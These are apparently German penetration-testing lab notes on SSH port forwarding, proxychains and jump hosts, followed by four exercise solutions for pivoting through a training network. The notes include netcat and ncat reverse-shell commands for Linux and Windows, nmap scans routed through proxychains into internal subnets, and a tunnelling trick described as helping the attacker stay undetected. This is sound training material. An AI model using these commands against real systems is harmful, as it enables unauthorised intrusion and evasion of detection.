- [SSH und Proxychains](#ssh-und-proxychains)
  - [SSH unter Windows](#ssh-unter-windows)
    - [Local Port Forwarding](#local-port-forwarding)
    - [Wenn Nologin-Account](#wenn-nologin-account)
    - [Remote Port Forwarding](#remote-port-forwarding)
    - [Problem: sshd\_config](#problem-sshd_config)
    - [Dynamic Port Forwarding](#dynamic-port-forwarding)
    - [Proxychains und DPF](#proxychains-und-dpf)
    - [SSH Proxy Jump](#ssh-proxy-jump)
    - [Sneaky Fynn Way](#sneaky-fynn-way)
  - [Aufgabe 1](#aufgabe-1)
  - [Aufgabe 2](#aufgabe-2)
  - [Aufgabe 3](#aufgabe-3)
  - [Aufgabe 4](#aufgabe-4)

---

# SSH und Proxychains

## SSH unter Windows

- Vor 2018 keine native SSH-Unterstützung für Windows -> Tool der Wahl "PuTTY" bzw. "PLink"

```bash
# z.B. Lokale Portweiterleitung

plink -ssh -L 2222:192.168.1.1:22 user@192.168.1.1
```

##Verwendung

### Local Port Forwarding

- ermöglicht es dem Nutzer einen lokalen Port seiner Wahl über einen Zwischenhost auf einen Port seiner Wahl zu einem entfernten Ziel zu spiegeln
- Datenfluss: **LPort zu TPort**

Beispiel:

```bash
# Weiterleitung von Port 5000 auf Port 22 des Ziels
# Optional : -fN für eine Background Session 
ssh -L 5000:10.1.5.251:22 user@192.168.1.1

# Anschließende SSH Verbindung auf Ziel
ssh user@127.0.0.1 -p 5000

# Es können auch mehrere Weiterleitungen mit einem Befehl eingerichtet
# werden

ssh -L 5000:10.1.5.251:22 5001:10.1.5.251:80 user@192.168.1.1
```

Wobei:

- LPort
    - Local Port von welchem Traffic weitergeleitet werden soll
    - als IP Adresse wird automatisch Local Host gesetzt
- Target
    - Ziel IP Adresse auf welche Local Port gespiegelt werden soll
    - Ziel muss dem Jump Host bekannt sein
    - Ziel kann auch der Jump Host selbst sein
- TPort
    - Port auf Ziel IP Adresse auf welchen Local Port gespiegelt werden soll
    - Low Ports benötigen Root-Rechte
- RHost
    - Jump Host IP Adresse auf welchem der SSH Service ausgeführt wird
    - Creds müssen bekannt und SSH/Alternativen vorhanden sein
- User
    - Username für die SSH-Verbindung auf dem Jump Host

### Wenn Nologin-Account

Unix Systeme bieten die Möglichkeit, User zu erstellen, welche sich nicht interaktiv einloggen dürfen. Dies unterbindet jedoch nicht die Erstellung eines Tunnels ohne interaktive Shell. **-> Verhindern der Erstellung einer interaktiven Shell bei der Tunnelerstellung**

Dafür den Schalter -fN:

```bash
# Aufbau eines Tunnels über einen nologin User

ssh -L 4444:10.1.5.251:22 noninteractiveuser@192.168.1.1 -fN

# Auszug aus der SSH-man
#       -f      Requests  ssh  to go to background just before command execution.  This is useful if ssh is going to ask for passwords or passphrases, but the user wants it in the background.  This implies -n.  The recommended way to start X11 programs at a remote site is with something like ssh -f host xterm.
#       -N      Do not execute a remote command.  This is useful for just forwarding ports.
```

### Remote Port Forwarding

- umgekehrt
- Datenfluss: **RPort zu TPort**

Beispiel:

```bash
# Weiterleitung einer Rev Shell von Port 8000 der RHosts 
# auf Port 1337 des Angreifers

ssh -R 8000:192.168.1.2:1337 user@192.168.1.1

# Listener für Rev Shell auf Port 1337 empfängt die Verbindung
```

Wobei:

- RPort
    - Port über den auf RHost weitergeleitet werden soll
    - Wird standardmäßig auf Localhost "geöffnet"
- Target
    - Ziel der Weiterleitung
    - Muss dem RHost bekannt sein
- TPort
    - Port auf Target zu welchem der Traffic weitergeleitet wird
- RHost
    - Jumphost auf welchem die Weiterleitung eingerichtet wird
    - Creds müssen bekannt und SSH/Alternativen vorhanden sein
- User
    - Username für die SSH-Verbindung auf dem Jump Host

### Problem: sshd_config

- RPF läuft nicht "out of the box"
- entsprechende SSH-Server wird die Remote-Weiterleitung nur über das Localhost-Interface laufen lassen
- Einstellung "GatewayPorts yes" des rHosts wodurch diesem ermöglicht wird, die aktivierte Weiterleitung nicht nur auf dem Localhost-Interface durchzuführen
- Änderung der config wirkt sich jeweils erst bei Neuaufbau der Weiterleitung aus, sowohl beim Aktivieren als auch beim Deaktivieren der "GatewayPorts"-Option
- Root-Rechte werden benötigt

Workaround mittels Socat oder Netcat:

```bash
# Annahme: RPF über localhost 8000 soll erreichbar sein von Außen über Port 8001
socat TCP4-LISTEN:8001,fork TCP4:127.0.0.1:8000

...

# Funktionell gleich mit Socat, aber instabil

#! /bin/bash
while :; do
	nc -l -p 8001 -c 'nc 127.0.0.1 8000'
done
```

### Dynamic Port Forwarding

- verwandelt den SSH-Server praktischerweise in einen Proxy-Server, welcher unseren Traffic über einen genannten Jump Host zum Ziel weiterleitet
- Unterschied zu LPF und RPF:
    - statt einem Source- und Destination-Port wird nur der Quellport angegeben
    - Verbindungen werden abhängig vom genutzten Protokoll direkt zum Ziel auf den entsprechenden Port weitergeleitet

Beispiel:

```bash
# DPF auf Port 1337 über Zielrechner

ssh -D 1337 user@192.168.1.1
```

### Proxychains und DPF

- Verwendung von DPF ermöglicht den Einsatz von "Proxychains"
    - um Verbindungen effektiv über einen SOCKS Proxy in ein anderes Netz weiterzuleiten

Config:

```bash
# Einstellung von Proxychains in proxychains.conf

tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks4 127.0.0.1 1337 # Port muss mit Port des DPF übereinstimmen!
```

-> alle mit dem Tool versendeten Anfragen laufen über den per SSH aufgebauten Proxy-Server

Usage:

```bash
# Weiterleiten eines Nmap Scans ins interne Netz

proxychains4 nmap -Pn -sT 10.1.5.0/24

# Weiterleiten einer SSH Verbindung ins interne Netz
# auf durch Scan aufgeklärtes Ziel

proxychains4 ssh user@10.1.5.251
```

_Zu nmap:_ <br>
_Es werden nur Full TCP Scans unterstützt_ <br>
_- kein UDP, auch nicht über SOCKS5 Proxy_ <br>
_- keine Host-Alive-Scans (deshalb -Pn beim Scan)_ <br>
_Scans werden sehr lange dauern_

### SSH Proxy Jump

- eingebaute Möglichkeit, um SSH-Verbindungen über zwischengeschaltete SSH-Server aufzubauen

Beispiel:

```bash
# Verbindungsaufbau zu 10.1.1.5 über 192.168.1.1

ssh -J user@192.168.1.1 user@10.1.1.5

# Auch mehrere Jump Hosts möglich

ssh -J user@192.168.1.1,user@10.1.1.5 user@5.1.56.241
```

Beim dem angegebenen Jump Host wird eine SSH-Verbindung mit dem entsprechenden User gestartet, über welche dann die nächste Verbindung aufgebaut wird. Hierfür werden natürlich die Creds des entsprechenden Users benötigt. _Funktioniert auch mit "/usr/sbin/nologin"-Shells_ <br>
Kann man auch in der ssh_config anlegen:

```bash
# nano /etc/ssh/ssh_config

Host server3
    HostName 5.1.56.241
    # SSH Port bei ProxyJump explizit angeben
    ProxyJump user@192.168.1.1:22,user@10.1.1.5:22 
    # User für server3 / 5.1.56.241
    User user

# Login erfolgt dann mit

ssh server3
```

### Sneaky Fynn Way

- Anlegen von Jump Hosts kann auch mit einer Portweiterleitung verbunden werden:

```bash
# nano /etc/ssh/ssh_config

Host server3
    HostName 5.1.56.241
    # SSH Port bei ProxyJump explizit angeben
    ProxyJump user@192.168.1.1:22,user@10.1.1.5:22 
    # User für server3 / 5.1.56.241
    User user
	RemoteForward 9999 127.0.0.1:9999

# Login erfolgt dann mit

ssh server3

# RevShell auf Server3 dann z.B. über 

nc 127.0.0.1 9999
```

Nach der Ausführung des SSH-Logins wird nun der RPF direkt über die Tunnelstrecke geleitet. Hierdurch wird das Erstellen einzelner RPF auf den Jump Hosts überflüssig und es müssen keine zusätzlichen Ports geöffnet werden. Dies hilft uns vor allem damit, deutlich leichter unentdeckt zu bleiben, da "nur" eine normale, stehende SSH-Verbindung auf das Ziel vorhanden ist.

-----------

## Aufgabe 1

**Arbeitet euch mit Hilfe von SSH, Proxychains und Nmap durch die einzelnen Netzwerke der Topologie, bis zum Erreichen des Webservers vor. Ziel ist es, die intern gehostete Webseite des Servers von eurem Angreifer aus aufrufen zu können.**

Gedachter Weg zum Webserver:
- Attacker
- DebianFront
- DebianNetMid
- WebServer

Ansatz:

SSH LPF mit Jump Hosts

```bash
ssh -L 8080:10.10.1.253:80 -J user@192.168.1.1 user@10.1.5.251 -fN

...

curl 127.0.0.1:8080 -I
HTTP/1.1 200 OK
[...]
```

## Aufgabe 2

**Errichtet Reverse Shells (z.B. mit Metasploit oder netcat) von aufgeklärten Windows und Linux Targets innerhalb des Netzwerkes. Nehmt hier jeweils ein Target von jedem Betriebssystem mit einem bzw. zwei Hops zwischen Target und Attacker.**

```bash
ssh -R 4567:localhost:8888 user@192.168.1.1

# Jetzt muss in der ssh_config GatewayPorts auf "yes" gesetzt werden
```

Auf der Attacker:

```bash
nc -lnvp 8888
```

Auf der Remote:

```bash
nc 10.1.5.252 4567 -e /bin/sh
```

Für Windows sieht es ähnlich aus, nur der Befehl auf der Windows-Remote-Maschine muss angepasst werden:

```powershell
ncat.exe 10.1.5.252 4567 -e cmd
```

So erhält man auf dem Listener eine CMD-Instanz.

## Aufgabe 3

**DebianFront besitzt einen "user2:user2" Account, welcher mittels /usr/sbin/nologin eine interaktive Shell verweigert bekommt. Nutzt diesen Account, um eine erfolgreiche Portweiterleitung einzurichten.**

Gleicher Ansatz wie bei Aufgabe 1 auch schon, nur dass 

```bash
-fN
```

als Schalter mit angegeben werden muss.

Der gesamte Befehl sieht dann wie folgt aus:

```bash
ssh -L 8080:10.10.1.253:80 -J user2@192.168.1.1 user@10.1.5.251 -fN
```

## Aufgabe 4

**Passt die ssh_config so an, dass eine Verbindung vom Angreifer bis zum Webserver über Jumphosts möglich ist.**

- Erstellen von "config" in ~/.ssh/

```bash
Host webserver
    HostName 10.10.1.253
    ProxyJump user@192.168.1.1,user@10.1.5.251
    User user
        LocalForward 8080 127.0.0.1:80
```

Auf der Attacker:

```bash
ssh webserver

...

curl 127.0.0.1:8080 -I
HTTP/1.1 200 OK
[...]
```